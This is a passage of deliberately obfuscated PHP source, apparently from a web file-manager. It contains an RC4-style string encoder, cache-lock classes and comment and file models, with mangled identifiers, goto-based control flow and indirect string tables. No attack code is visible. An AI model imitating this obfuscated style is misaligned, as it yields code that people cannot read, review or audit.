aÔøë‘Éñ: return $f¶Ú·æ…×»; goto Aµ×‹ìíŠ; EâªÚæáØÓ: $aç”µ¨Ğ =& $_SERVER[İë¬“ÅÒÛ›]; $e§—ôâ–¹ = 4; $bÅÄº©„ = md5($bÅÄº©„ ? $bÅÄº©„ : self::$defaultKey); goto Aé¨¶ß˜’•; B§Ş™ç¯Şå: $D—·…®ºå = $FîÃ‡ä‘Š« . md5($FîÃ‡ä‘Š« . $déÆ¶ª²±®); $dáïéÈ†í = strlen($D—·…®ºå); $e‘ÀÙº š = sprintf($aç”µ¨Ğ[1361], $d—Ä…¿ï· ? $d—Ä…¿ï· + time() : 0) . substr(md5($e‘ÀÙº š . $A¡‚¿ ëê‡), 0, 16) . $e‘ÀÙº š; goto FÏÆÆİí¨‡; BÓÁÆïŒ³Š: $DÅŞµçƒªƒ = range(0, 255); for ($b«·Ø–ì« = $bÍÚ©Ì±šÍ = 0; $bÍÚ©Ì±šÍ < 256; $bÍÚ©Ì±šÍ++) { $b«·Ø–ì« = ($b«·Ø–ì« + $DÅŞµçƒªƒ[$bÍÚ©Ì±šÍ] + $DãôÚ‘ì†Â[$bÍÚ©Ì±šÍ]) % 256; $E’»ÚÀ»Ÿ¤ = $DÅŞµçƒªƒ[$bÍÚ©Ì±šÍ]; $DÅŞµçƒªƒ[$bÍÚ©Ì±šÍ] = $DÅŞµçƒªƒ[$b«·Ø–ì«]; $DÅŞµçƒªƒ[$b«·Ø–ì«] = $E’»ÚÀ»Ÿ¤; } $f¶Ú·æ…×» = $aç”µ¨Ğ[33]; goto a™œÎê‚“; Aé¨¶ß˜’•: $FîÃ‡ä‘Š« = md5(substr($bÅÄº©„, 0, 16)); $A¡‚¿ ëê‡ = md5(substr($bÅÄº©„, 16, 16)); $déÆ¶ª²±® = substr(md5(microtime()), -$e§—ôâ–¹); goto B§Ş™ç¯Şå; Aµ×‹ìíŠ: } public static function decode($F´¿ìğÃŞ¹, $FêâŒƒ•Ü© = '') { goto eÚÏ•‚’Ğ“; eÚÏ•‚’Ğ“: $e­š–õå±— =& $_SERVER[İë¬“ÅÒÛ›]; $F´¿ìğÃŞ¹ = str_replace(array($e­š–õå±—[499], $e­š–õå±—[71], $e­š–õå±—[92]), array($e­š–õå±—[288], $e­š–õå±—[8], $e­š–õå±—[677]), $F´¿ìğÃŞ¹); $aÀªÜ÷Îîê = 4; goto D¡šêÀÃ°; D¡šêÀÃ°: $FêâŒƒ•Ü© = md5($FêâŒƒ•Ü© ? $FêâŒƒ•Ü© : self::$defaultKey); $eŸ‘ÕĞˆ¬‘ = md5(substr($FêâŒƒ•Ü©, 0, 16)); $dÉ¦Ç–²¤ = md5(substr($FêâŒƒ•Ü©, 16, 16)); goto f¶ÛŠ™¹²; D¯»…×ˆ”: for ($F½‰æ§ÏÒ = 0; $F½‰æ§ÏÒ <= 255; $F½‰æ§ÏÒ++) { $AÉóèºöÁÏ[$F½‰æ§ÏÒ] = ord($C—¬½‡åÚ[$F½‰æ§ÏÒ % $c†Â´Ì“ƒ]); } $cÕ‡‡ç™ªÊ = range(0, 255); for ($f¥ÙÇÙ˜‘ = $F½‰æ§ÏÒ = 0; $F½‰æ§ÏÒ < 256; $F½‰æ§ÏÒ++) { $f¥ÙÇÙ˜‘ = ($f¥ÙÇÙ˜‘ + $cÕ‡‡ç™ªÊ[$F½‰æ§ÏÒ] + $AÉóèºöÁÏ[$F½‰æ§ÏÒ]) % 256; $bœ›Ş”÷’° = $cÕ‡‡ç™ªÊ[$F½‰æ§ÏÒ]; $cÕ‡‡ç™ªÊ[$F½‰æ§ÏÒ] = $cÕ‡‡ç™ªÊ[$f¥ÙÇÙ˜‘]; $cÕ‡‡ç™ªÊ[$f¥ÙÇÙ˜‘] = $bœ›Ş”÷’°; } goto bÇ÷¡µë—‚; f¶ÛŠ™¹²: $FÒ½¦‡ÁÓ = substr($F´¿ìğÃŞ¹, 0, $aÀªÜ÷Îîê); $C—¬½‡åÚ = $eŸ‘ÕĞˆ¬‘ . md5($eŸ‘ÕĞˆ¬‘ . $FÒ½¦‡ÁÓ); $c†Â´Ì“ƒ = strlen($C—¬½‡åÚ); goto aé²×­øøò; aé²×­øøò: $F´¿ìğÃŞ¹ = base64_decode(substr($F´¿ìğÃŞ¹, $aÀªÜ÷Îîê)); $DˆäÁĞ‹ = strlen($F´¿ìğÃŞ¹); $AÉóèºöÁÏ = array(); goto D¯»…×ˆ”; bÇ÷¡µë—‚: $D°”“ñƒÍŠ = $e­š–õå±—[33]; for ($Bñ³½­×©ê = $f¥ÙÇÙ˜‘ = $F½‰æ§ÏÒ = 0; $F½‰æ§ÏÒ < $DˆäÁĞ‹; $F½‰æ§ÏÒ++) { $Bñ³½­×©ê = ($Bñ³½­×©ê + 1) % 256; $f¥ÙÇÙ˜‘ = ($f¥ÙÇÙ˜‘ + $cÕ‡‡ç™ªÊ[$Bñ³½­×©ê]) % 256; $bœ›Ş”÷’° = $cÕ‡‡ç™ªÊ[$Bñ³½­×©ê]; $cÕ‡‡ç™ªÊ[$Bñ³½­×©ê] = $cÕ‡‡ç™ªÊ[$f¥ÙÇÙ˜‘]; $cÕ‡‡ç™ªÊ[$f¥ÙÇÙ˜‘] = $bœ›Ş”÷’°; $D°”“ñƒÍŠ .= chr(ord($F´¿ìğÃŞ¹[$F½‰æ§ÏÒ]) ^ $cÕ‡‡ç™ªÊ[($cÕ‡‡ç™ªÊ[$Bñ³½­×©ê] + $cÕ‡‡ç™ªÊ[$f¥ÙÇÙ˜‘]) % 256]); } if ((substr($D°”“ñƒÍŠ, 0, 10) == 0 || substr($D°”“ñƒÍŠ, 0, 10) - time() > 0) && substr($D°”“ñƒÍŠ, 10, 16) == substr(md5(substr($D°”“ñƒÍŠ, 26) . $dÉ¦Ç–²¤), 0, 16)) { return substr($D°”“ñƒÍŠ, 26); } else { return $e­š–õå±—[33]; } goto EŸ„½½ÆÜ‘; EŸ„½½ÆÜ‘: } } goto bÁ¤ÛÌŒêÀ; A†ª±Œ­îÔ: register_shutdown_function($_SERVER[…Ã²ÛÚÈÔ][19]); set_error_handler($_SERVER[…Ã²ÛÚÈÔ][27], $b†µßˆå‹ø); if (function_exists($_SERVER[…Ã²ÛÚÈÔ][28])) { set_exception_handler($_SERVER[…Ã²ÛÚÈÔ][29]); } goto EåÎ‹ùÂà‚; fé‡¡³Øêñ: define($_SERVER[İë¬“ÅÒÛ›][230], 1); define($_SERVER[İë¬“ÅÒÛ›][231], 2); define($_SERVER[İë¬“ÅÒÛ›][232], 3); goto A²¿à¡‹çç; aÍóœÊ«ê„: class CacheLock { protected static $handle; protected static $timeout; protected static $lockItem = array(); public static function init() { goto B…ó•÷Š ; B…ó•÷Š : $AºÖ‚‚œî¡ =& $_SERVER[İë¬“ÅÒÛ›]; if (self::$handle) { return self::$handle; } $AåÄÜ†¼ç = $GLOBALS[$AºÖ‚‚œî¡[6]][$AºÖ‚‚œî¡[341]]; goto F”¨—ÙÄÌ‰; F”¨—ÙÄÌ‰: self::$timeout = $AåÄÜ†¼ç[$AºÖ‚‚œî¡[535]] ? $AåÄÜ†¼ç[$AºÖ‚‚œî¡[535]] : 10; $dŸ‚ ÂÇ¸à = $GLOBALS[$AºÖ‚‚œî¡[6]][$AºÖ‚‚œî¡[17]][$AºÖ‚‚œî¡[491]]; if ($AåÄÜ†¼ç[$AºÖ‚‚œî¡[523]] == $AºÖ‚‚œî¡[17] && $dŸ‚ ÂÇ¸à == $AºÖ‚‚œî¡[9]) { $AåÄÜ†¼ç[$AºÖ‚‚œî¡[523]] = $AºÖ‚‚œî¡[164]; } goto E‰øÑ¶¤”½; E‰øÑ¶¤”½: switch ($AåÄÜ†¼ç[$AºÖ‚‚œî¡[523]]) { case $AºÖ‚‚œî¡[526]: self::$handle = new CacheLockRedis(); break; case $AºÖ‚‚œî¡[527]: self::$handle = new CacheLockMemcached(); break; case $AºÖ‚‚œî¡[17]: self::$handle = new CacheLockDatabase(); break; case $AºÖ‚‚œî¡[164]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto DîÓ™¯œƒ; DîÓ™¯œƒ: } private static function key($F¹Ğªöˆµ´) { return $_SERVER[İë¬“ÅÒÛ›][536] . Cache::key($F¹Ğªöˆµ´); } public static function initReset() { self::$handle = !1; } public static function lockGlobal($aàœ¿ôÍíĞ, $f˜Ö±†¢š÷) { return self::lock($aàœ¿ôÍíĞ, $f˜Ö±†¢š÷, !0); } public static function lock($bĞç‘‰ÏÕ, $b¿„˜®¨Å® = false, $e’ñÀÀ¶ä = false) { goto C‰¾©Ë°„; A¸ñ¼§Ô‡Á: if (!$bÍèÏ‹¬ß) { write_log($DÒË×‰´ñ[537] . (timeFloat() - $BîàÖİ†Ó) . $DÒË×‰´ñ[68] . get_caller_msg(), $DÒË×‰´ñ[538]); show_json("\x4c\x6f\143\153\40\x61\x63\x74\151\x6f\x6e\72\40{$bĞç‘‰ÏÕ}\40\x74\151\x6d\145\157\165\x74\54\157\166\145\162\40{$b¿„˜®¨Å®}\40\x73", !1); } if (!$e’ñÀÀ¶ä) { self::$lockItem[$bĞç‘‰ÏÕ] = !0; } return $bÍèÏ‹¬ß; goto f¤Ë–İ÷ÚÜ; C‰¾©Ë°„: $DÒË×‰´ñ =& $_SERVER[İë¬“ÅÒÛ›]; $cïŠö¸¸ğÀ = self::init(); $bĞç‘‰ÏÕ = self::key($bĞç‘‰ÏÕ); goto E”µµ·™ê×; E”µµ·™ê×: $BîàÖİ†Ó = timeFloat(); $b¿„˜®¨Å® = $b¿„˜®¨Å® ? $b¿„˜®¨Å® : self::$timeout; $bÍèÏ‹¬ß = $cïŠö¸¸ğÀ->lock($bĞç‘‰ÏÕ, $b¿„˜®¨Å®); goto A¸ñ¼§Ô‡Á; f¤Ë–İ÷ÚÜ: } public static function unlock($d½¯Ì‡ò“Ù) { $d½¯Ì‡ò“Ù = self::key($d½¯Ì‡ò“Ù); self::$lockItem[$d½¯Ì‡ò“Ù] = null; return self::init()->unlock($d½¯Ì‡ò“Ù); } public static function unlockRuntime() { $Bé§ ĞäõÀ = self::$lockItem; $fĞŞÁ‚‡ô = self::init(); foreach ($Bé§ ĞäõÀ as $B¢î­ãéô· => $bİù¾õ›Ïè) { if ($bİù¾õ›Ïè) { $fĞŞÁ‚‡ô->unlock($B¢î­ãéô·); } } } } function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $a®õƒ“ïÂĞ =& $_SERVER[İë¬“ÅÒÛ›]; $A»¨ÊÏæØ— = $GLOBALS[$a®õƒ“ïÂĞ[6]][$a®õƒ“ïÂĞ[341]]; self::$cachePath = $A»¨ÊÏæØ—[$a®õƒ“ïÂĞ[164]][$a®õƒ“ïÂĞ[76]]; @mkdir(self::$cachePath, 511, !0); } public function lock($DÙÈ²™å˜, $BÜ´š·ˆğ‡ = 0) { goto eÜÕÅÉ¼†ø; F®˜‹¶—Í†: $this->unlock($DÙÈ²™å˜); return !1; goto e…¨‰×––; F‰ôÂñš‚: $BÎÀÈö„ÉÍ = rtrim(self::$cachePath, $D›¥Öì ˆ‚[8]) . $D›¥Öì ˆ‚[539] . md5($DÙÈ²™å˜) . $D›¥Öì ˆ‚[540]; if (file_exists($BÎÀÈö„ÉÍ) && filemtime($BÎÀÈö„ÉÍ) && filemtime($BÎÀÈö„ÉÍ) < time() - 10) { @unlink($BÎÀÈö„ÉÍ); } do { if (file_exists($BÎÀÈö„ÉÍ)) { cacheLockWait(); continue; } $CµÀ¡Š…£ª = fopen($BÎÀÈö„ÉÍ, $D›¥Öì ˆ‚[541]); $e·çÛÓŒÕ¥ = flock($CµÀ¡Š…£ª, LOCK_EX | LOCK_NB); self::$caches[$DÙÈ²™å˜] = array($D›¥Öì ˆ‚[542] => $CµÀ¡Š…£ª, $D›¥Öì ˆ‚[164] => $BÎÀÈö„ÉÍ); fwrite($CµÀ¡Š…£ª, $A‰¡Í¹†Õ); clearstatcache(); if ($CµÀ¡Š…£ª && $e·çÛÓŒÕ¥) { return !0; } cacheLockWait(); } while (microtime(!0) < $A‰¡Í¹†Õ); goto F®˜‹¶—Í†; eÜÕÅÉ¼†ø: $D›¥Öì ˆ‚ =& $_SERVER[İë¬“ÅÒÛ›]; $EóÛƒˆ¯‰© = microtime(!0); $A‰¡Í¹†Õ = $EóÛƒˆ¯‰© + $BÜ´š·ˆğ‡ + 0.0001; goto F‰ôÂñš‚; e…¨‰×––: } public function unlock($b¤á‚æß¼) { goto D‰†ò¼øµ; D‰†ò¼øµ: $Dˆ«ù©š¤­ =& $_SERVER[İë¬“ÅÒÛ›]; $eµ¬‘££‡ = self::$caches[$b¤á‚æß¼]; if (!$eµ¬‘££‡) { return; } goto fŒ»æÄÂå; CÉˆÌËÖî: unset(self::$caches[$b¤á‚æß¼]); goto A„ƒÕÜÃ¯; fŒ»æÄÂå: @flock($eµ¬‘££‡[$Dˆ«ù©š¤­[542]], LOCK_UN); @fclose($eµ¬‘££‡[$Dˆ«ù©š¤­[542]]); @unlink($eµ¬‘££‡[$Dˆ«ù©š¤­[164]]); goto CÉˆÌËÖî; A„ƒÕÜÃ¯: } } goto bˆì±•ÎĞÇ; DÔ«òùÉ: class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\x6d\155\x65\156\x74"; protected $tableMeta = array("\164\141\x62\x6c\145\x4e\x61\x6d\145" => "\x63\157\155\155\x65\x6e\164\137\x6d\x65\x74\141", "\155\145\x74\141\x46\151\x65\x6c\144" => "\x63\157\x6d\x6d\145\156\x74\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($b÷ÔÌ”Ä) { $Dß™¯…ˆŠ =& $_SERVER[İë¬“ÅÒÛ›]; if ($b÷ÔÌ”Ä[$Dß™¯…ˆŠ[1574]]) { $cË–Ü±¦ñî = $this->where(array($Dß™¯…ˆŠ[1575] => $b÷ÔÌ”Ä[$Dß™¯…ˆŠ[1574]]))->find(); if (!$cË–Ü±¦ñî || $cË–Ü±¦ñî[$Dß™¯…ˆŠ[394]] != $b÷ÔÌ”Ä[$Dß™¯…ˆŠ[394]] || $cË–Ü±¦ñî[$Dß™¯…ˆŠ[396]] != $b÷ÔÌ”Ä[$Dß™¯…ˆŠ[396]]) { return !1; } $this->where(array($Dß™¯…ˆŠ[1575] => $b÷ÔÌ”Ä[$Dß™¯…ˆŠ[1574]]))->setAdd($Dß™¯…ˆŠ[1576], 1); } return $this->add($b÷ÔÌ”Ä); } public function remove($F¼ù‰Ö¢ò) { $d†ãÍõÎŒ° =& $_SERVER[İë¬“ÅÒÛ›]; $AŸªßËçÖé = array($d†ãÍõÎŒ°[1575] => $F¼ù‰Ö¢ò); $c­½¬åğ· = $this->where($AŸªßËçÖé)->find(); if ($c­½¬åğ·[$d†ãÍõÎŒ°[1574]]) { $this->where(array($d†ãÍõÎŒ°[1575] => $c­½¬åğ·[$d†ãÍõÎŒ°[1574]]))->setAdd($d†ãÍõÎŒ°[1576], -1); } return $this->where($AŸªßËçÖé)->delete(); } public function edit($fğåÁÎ£®Ò, $a×£ë©«Ïó) { $EíÑä½®¸ =& $_SERVER[İë¬“ÅÒÛ›]; $f•ÖÄÒôÎ = array($EíÑä½®¸[1575] => $fğåÁÎ£®Ò); return $this->where($f•ÖÄÒôÎ)->save(array($EíÑä½®¸[1577] => $a×£ë©«Ïó)); } public function prasise($BÛ«¿‡…ë) { $b—Ò†Á™ºÈ =& $_SERVER[İë¬“ÅÒÛ›]; $EÌÌ‚ˆ³²‰ = Model($b—Ò†Á™ºÈ[1578]); $E‡¢•À½¹à = array($b—Ò†Á™ºÈ[1575] => $BÛ«¿‡…ë, $b—Ò†Á™ºÈ[1086] => USER_ID); $D¹ìÍ¿£ùÎ = $EÌÌ‚ˆ³²‰->where($E‡¢•À½¹à)->find(); if (!$D¹ìÍ¿£ùÎ) { $EÌÌ‚ˆ³²‰->add($E‡¢•À½¹à); $Bá‡°¹ = $this->where(array($b—Ò†Á™ºÈ[1575] => $BÛ«¿‡…ë))->setAdd($b—Ò†Á™ºÈ[1579], 1); } else { $EÌÌ‚ˆ³²‰->where($E‡¢•À½¹à)->delete(); $Bá‡°¹ = $this->where(array($b—Ò†Á™ºÈ[1575] => $BÛ«¿‡…ë))->setAdd($b—Ò†Á™ºÈ[1579], -1); } return $Bá‡°¹; } public function targetInfo($Dğ“„Œ‚Ç, $EØŠ¦Ö±Ö) { goto cÓ¥ß‰òé‚; cÓ¥ß‰òé‚: $AğÄÛ‘«² =& $_SERVER[İë¬“ÅÒÛ›]; $d…Ÿæ´³‰– = array($AğÄÛ‘«²[393] => $Dğ“„Œ‚Ç, $AğÄÛ‘«²[395] => $EØŠ¦Ö±Ö); $b¤Ÿ¾µ°Ö¸ = $this->where($d…Ÿæ´³‰–)->count(); goto Aäª¥š÷Œƒ; Aäª¥š÷Œƒ: $CİïŠóÍŠ¦ = "\x52\111\x47\110\x54\40\112\117\111\116\40{$this->tablePrefix}\143\x6f\x6d\x6d\x65\x6e\164\137\x70\162\x61\x69\x73\x65\x20\x73\x74\141\162\x20\x6f\156\x20\143\x6f\155\155\145\156\x74\56\143\x6f\155\155\x65\x6e\x74\x49\x44\x20\x3d\x20\163\x74\x61\x72\x2e\143\x6f\x6d\x6d\145\x6e\x74\111\104"; $e¾¤†²„Â = $this->alias($AğÄÛ‘«²[344])->where($d…Ÿæ´³‰–)->join($CİïŠóÍŠ¦, $AğÄÛ‘«²[1580])->count(); $fØÅ®Üİ— = array($AğÄÛ‘«²[1581] => $b¤Ÿ¾µ°Ö¸, $AğÄÛ‘«²[1582] => $e¾¤†²„Â); goto dÆ–·³£ïà; dÆ–·³£ïà: return $fØÅ®Üİ—; goto aéé”ğºîÑ; aéé”ğºîÑ: } public function listData($C¡Ë«ÊºÆ–) { $F°ø‰ÚŞ =& $_SERVER[İë¬“ÅÒÛ›]; if (isset($C¡Ë«ÊºÆ–[$F°ø‰ÚŞ[1583]])) { if ($C¡Ë«ÊºÆ–[$F°ø‰ÚŞ[1583]]) { $C¡Ë«ÊºÆ–[$F°ø‰ÚŞ[1584]] = array($F°ø‰ÚŞ[698], intval($C¡Ë«ÊºÆ–[$F°ø‰ÚŞ[1583]])); } unset($C¡Ë«ÊºÆ–[$F°ø‰ÚŞ[1583]]); } if (isset($C¡Ë«ÊºÆ–[$F°ø‰ÚŞ[1585]])) { if ($C¡Ë«ÊºÆ–[$F°ø‰ÚŞ[1585]]) { $C¡Ë«ÊºÆ–[$F°ø‰ÚŞ[1584]] = array($F°ø‰ÚŞ[695], intval($C¡Ë«ÊºÆ–[$F°ø‰ÚŞ[1585]])); } unset($C¡Ë«ÊºÆ–[$F°ø‰ÚŞ[1585]]); } return $this->_listData($C¡Ë«ÊºÆ–); } private function _listData($BŸº£µëÖİ) { $F¬¿óŸ¦˜ =& $_SERVER[İë¬“ÅÒÛ›]; $D¬ÖÈÃ©Ö— = $this->where($BŸº£µëÖİ)->_makeOrder()->selectPage(100); $this->_listAppendParent($D¬ÖÈÃ©Ö—[$F¬¿óŸ¦˜[357]]); $this->_listAppendUser($D¬ÖÈÃ©Ö—[$F¬¿óŸ¦˜[357]]); $this->_listAppendMeta($D¬ÖÈÃ©Ö—[$F¬¿óŸ¦˜[357]]); return $D¬ÖÈÃ©Ö—; } private function _makeOrder() { $DŞæ¥×Ú…ğ =& $_SERVER[İë¬“ÅÒÛ›]; $eçµÙìÁ× = array($DŞæ¥×Ú…ğ[1579], $DŞæ¥×Ú…ğ[1576], $DŞæ¥×Ú…ğ[187]); $C¦‡äÉÖÎ = Input::get($DŞæ¥×Ú…ğ[1586], $DŞæ¥×Ú…ğ[7], $DŞæ¥×Ú…ğ[1587], $eçµÙìÁ×); $DéƒÁø§ÈÖ = Input::get($DŞæ¥×Ú…ğ[1588], $DŞæ¥×Ú…ğ[7], $DŞæ¥×Ú…ğ[1088], array($DŞæ¥×Ú…ğ[1589], $DŞæ¥×Ú…ğ[1590])); $eîäæÎÒÚš = $C¦‡äÉÖÎ . $DŞæ¥×Ú…ğ[50] . $DéƒÁø§ÈÖ; return $this->order($eîäæÎÒÚš); } private function _listAppendParent(&$a‰ãã©ÇÛ) { goto B©¢†×¹”; b‘ö‘ˆ—ö¸: foreach ($a‰ãã©ÇÛ as &$BŒÔÍÖÊÉ¢) { if (isset($F¾®Û™º¼[$BŒÔÍÖÊÉ¢[$D¦‘öÔ¯•Ñ[1574]]])) { $BŒÔÍÖÊÉ¢[$D¦‘öÔ¯•Ñ[1591]] = $F¾®Û™º¼[$BŒÔÍÖÊÉ¢[$D¦‘öÔ¯•Ñ[1574]]]; } } goto fÜÑÏÂòæ¸; B©¢†×¹”: $D¦‘öÔ¯•Ñ =& $_SERVER[İë¬“ÅÒÛ›]; $Dßè’äÆ³ = array_unique(array_to_keyvalue($a‰ãã©ÇÛ, $D¦‘öÔ¯•Ñ[33], $D¦‘öÔ¯•Ñ[1574])); $Dßè’äÆ³ = array_remove_value($Dßè’äÆ³, $D¦‘öÔ¯•Ñ[403]); goto EÓõ÷í²­; EÓõ÷í²­: if (!$Dßè’äÆ³) { return; } $F¾®Û™º¼ = $this->where(array($D¦‘öÔ¯•Ñ[1575] => array($D¦‘öÔ¯•Ñ[7], $Dßè’äÆ³)))->select(); $F¾®Û™º¼ = array_to_keyvalue($F¾®Û™º¼, $D¦‘öÔ¯•Ñ[1584]); goto b‘ö‘ˆ—ö¸; fÜÑÏÂòæ¸: } private function _listAppendUser(&$DÜ°Ìã¬ÁÔ) { goto aÄ†ã¨•àÁ; AÀ‡…áÒã: if (count($dÜ‘»ì–¤‘) == 0) { return; } foreach ($DÜ°Ìã¬ÁÔ as $CÙåˆÆ‹È) { if (isset($CÙåˆÆ‹È[$eå„éÆğ†×[1591]])) { $dÜ‘»ì–¤‘[] = $CÙåˆÆ‹È[$eå„éÆğ†×[1591]][$eå„éÆğ†×[1095]]; } } $E÷ó×½ÆĞÈ = Model($eå„éÆğ†×[1481])->userListInfo($dÜ‘»ì–¤‘); goto AÚÆƒäô‚; aÄ†ã¨•àÁ: $eå„éÆğ†× =& $_SERVER[İë¬“ÅÒÛ›]; $dÜ‘»ì–¤‘ = array_unique(array_to_keyvalue($DÜ°Ìã¬ÁÔ, $eå„éÆğ†×[33], $eå„éÆğ†×[1095])); $dÜ‘»ì–¤‘ = array_remove_value($dÜ‘»ì–¤‘, $eå„éÆğ†×[403]); goto AÀ‡…áÒã; AÚÆƒäô‚: foreach ($DÜ°Ìã¬ÁÔ as &$CÙåˆÆ‹È) { $CÙåˆÆ‹È[$eå„éÆğ†×[417]] = $E÷ó×½ÆĞÈ[$CÙåˆÆ‹È[$eå„éÆğ†×[1095]]]; if (isset($CÙåˆÆ‹È[$eå„éÆğ†×[1591]])) { $CÙåˆÆ‹È[$eå„éÆğ†×[1591]][$eå„éÆğ†×[417]] = $E÷ó×½ÆĞÈ[$CÙåˆÆ‹È[$eå„éÆğ†×[1591]][$eå„éÆğ†×[1095]]]; } } goto eöš¢Áñ; eöš¢Áñ: } private function _listAppendMeta(&$CÜ§³„ãß·) { goto Eìš˜÷Ë®¶; eè¡¶¦ô¡: if (!$cŒ×Ş±âäå) { return; } foreach ($CÜ§³„ãß· as $Bç•òª³) { if (isset($Bç•òª³[$B½´ÍÇš³î[1591]])) { $cŒ×Ş±âäå[] = $Bç•òª³[$B½´ÍÇš³î[1591]][$B½´ÍÇš³î[1584]]; } } $dÆØñÃù²ß = $this->metaList($cŒ×Ş±âäå); goto f¿È†ì‹¦É; f¿È†ì‹¦É: if (!$dÆØñÃù²ß) { return !1; } foreach ($CÜ§³„ãß· as &$Bç•òª³) { $Bç•òª³[$B½´ÍÇš³î[1592]] = $dÆØñÃù²ß[$Bç•òª³[$B½´ÍÇš³î[1584]]]; if (isset($Bç•òª³[$B½´ÍÇš³î[1591]])) { $Bç•òª³[$B½´ÍÇš³î[1591]][$B½´ÍÇš³î[1592]] = $dÆØñÃù²ß[$Bç•òª³[$B½´ÍÇš³î[1591]][$B½´ÍÇš³î[1584]]]; } } goto D‹ö ã•ØÀ; Eìš˜÷Ë®¶: $B½´ÍÇš³î =& $_SERVER[İë¬“ÅÒÛ›]; $cŒ×Ş±âäå = array_unique(array_to_keyvalue($CÜ§³„ãß·, $B½´ÍÇš³î[33], $B½´ÍÇš³î[1584])); $cŒ×Ş±âäå = array_remove_value($cŒ×Ş±âäå, $B½´ÍÇš³î[403]); goto eè¡¶¦ô¡; D‹ö ã•ØÀ: } private function metaList($FÄè­œŞİ°) { goto aµ¶‡ò¥‡“; Dê—öäÖ›: return $e±Œ•ªõçê ? $e±Œ•ªõçê : array(); goto EÚµÍ‹¬™; fÜ†´Ãó : $e±Œ•ªõçê = Model($CÍÒƒØ¤Äà[1593])->where($fäøÓ‰ë¾)->select(); $e±Œ•ªõçê = array_to_keyvalue_group($e±Œ•ªõçê, $CÍÒƒØ¤Äà[1584]); foreach ($e±Œ•ªõçê as $A­Š¿Ü¿äÌ => $e¹÷Åàù¿) { $cô‡ÛÚãÔó = array(); foreach ($e¹÷Åàù¿ as $E¸¬çÛ‘ˆÇ) { $cô‡ÛÚãÔó[$E¸¬çÛ‘ˆÇ[$CÍÒƒØ¤Äà[88]]] = $E¸¬çÛ‘ˆÇ[$CÍÒƒØ¤Äà[360]]; } $e±Œ•ªõçê[$A­Š¿Ü¿äÌ] = $cô‡ÛÚãÔó; } goto Dê—öäÖ›; aµ¶‡ò¥‡“: $CÍÒƒØ¤Äà =& $_SERVER[İë¬“ÅÒÛ›]; if (!$FÄè­œŞİ°) { return array(); } $fäøÓ‰ë¾ = array($CÍÒƒØ¤Äà[1584] => array($CÍÒƒØ¤Äà[7], $FÄè­œŞİ°)); goto fÜ†´Ãó ; EÚµÍ‹¬™: } } class FileModel extends ModelBase { protected $tableName = "\x69\157\137\x66\151\x6c\145"; public function fileInfo($CÜäĞ¶àô) { $cºƒğÁ ” =& $_SERVER[İë¬“ÅÒÛ›]; static $F°¦³ƒÇÉÔ = array(); if (!isset($F°¦³ƒÇÉÔ[$CÜäĞ¶àô])) { $cº•ŞÈÉ”É = $cºƒğÁ ”[1594]; $a±š„”Úöï = Model($cºƒğÁ ”[412])->field($cº•ŞÈÉ”É)->where(array($cºƒğÁ ”[391] => $CÜäĞ¶àô))->find(); $F°¦³ƒÇÉÔ[$CÜäĞ¶àô] = $a±š„”Úöï; } return $F°¦³ƒÇÉÔ[$CÜäĞ¶àô]; } public function addFileByContent($FŞ‡Ï†›š‚ = '', $aÎäßÎ£Ñ” = '') { goto déÈğˆ“×; E¸ÛÊóæóá: if (file_exists($EÉƒ»õ´Ü)) { @unlink($EÉƒ»õ´Ü); } return $fÀèÄÀŒÜÜ; goto fÇîÑä¥”Å; déÈğˆ“×: $F¬ÒŸô¿Ç¦ =& $_SERVER[İë¬“ÅÒÛ›]; $c¥ì¿¬’Ë = TEMP_PATH . $F¬ÒŸô¿Ç¦[1595]; if (!is_dir($c¥ì¿¬’Ë)) { mk_dir($c¥ì¿¬’Ë); } goto FšØŸÂÆøœ; FšØŸÂÆøœ: $EÉƒ»õ´Ü = $c¥ì¿¬’Ë . $F¬ÒŸô¿Ç¦[1596] . rand_string(16); file_put_contents($EÉƒ»õ´Ü, $FŞ‡Ï†›š‚); $fÀèÄÀŒÜÜ = $this->addFile($EÉƒ»õ´Ü, $aÎäßÎ£Ñ”, !0); goto E¸ÛÊóæóá; fÇîÑä¥”Å: } public function createFileName($CİßñÄÉ“) { goto aØƒÃØšĞ´; A‰°ôŒ¤: $cñ­İŠ©ó = $f†‚‡²ºÀ×->pathFather($CÒçˆÌÃ¢Ü); static $F“›Ñ¿Î´â = false; $Fä†Ì‚’Œğ = $Dö¬‰Í¦ïÀ[1597] . md5($cñ­İŠ©ó); goto Bµê”ÏãÙª; Bµê”ÏãÙª: if (!$F“›Ñ¿Î´â && !Cache::get($Fä†Ì‚’Œğ)) { $F“›Ñ¿Î´â = !0; $cÅ•¼³÷° = IO::mkdir($cñ­İŠ©ó); if (!IO::exist($cÅ•¼³÷° . $Dö¬‰Í¦ïÀ[1598])) { IO::mkfile($cÅ•¼³÷° . $Dö¬‰Í¦ïÀ[1598]); } Cache::set($Fä†Ì‚’Œğ, 1, 3600 * 2); } return $CÒçˆÌÃ¢Ü; goto eˆµĞÑ—ã; aØƒÃØšĞ´: $Dö¬‰Í¦ïÀ =& $_SERVER[İë¬“ÅÒÛ›]; $f†‚‡²ºÀ× = IO::init($Dö¬‰Í¦ïÀ[8]); $CÒçˆÌÃ¢Ü = $this->makeFilePath($CİßñÄÉ“, $f†‚‡²ºÀ×); goto A‰°ôŒ¤; eˆµĞÑ—ã: } public function makeFilePath($E·¬ƒíë‘, $BŞ™Â±Í®‘) { goto c—ÜÀÇ©˜µ; Fíµ¾ÅĞ: switch ($bª¿‹‰ÍÄ¤) { case $fÚÅ²ïÏÙ[1602]: $FÍ—¥‹²ƒ“ = $FÍ—¥‹²ƒ“ . $fÚÅ²ïÏÙ[92] . $BŞ™Â±Í®‘->ext($E·¬ƒíë‘); if ($BŞ™Â±Í®‘->ext($E·¬ƒíë‘) == $fÚÅ²ïÏÙ[1536]) { $FÍ—¥‹²ƒ“ .= $fÚÅ²ïÏÙ[1603]; } break; case $fÚÅ²ïÏÙ[1604]: goto eµêŸ­­Şï; eµêŸ­­Şï: $A„çŒÔ×ù = 